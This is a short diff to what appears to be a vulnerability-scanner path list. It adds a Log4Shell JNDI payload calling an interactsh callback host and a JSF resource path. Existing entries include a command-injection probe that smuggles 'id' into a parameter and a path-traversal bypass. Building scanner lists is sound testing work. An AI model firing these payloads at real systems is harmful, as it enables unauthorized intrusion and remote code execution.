@@ -279,3 +279,5 @@ login
 /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>gwfudsjfvcdha3278yrhu.txt
 /Interface/LogReport/gwfudsjfvcdha3278yrhu.txt
 /seeyon/thirdpartyController.do.css/..;/ajax.do
+/imc/javax.faces.resource/dynamiccontent.properties.xhtml
+/api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}
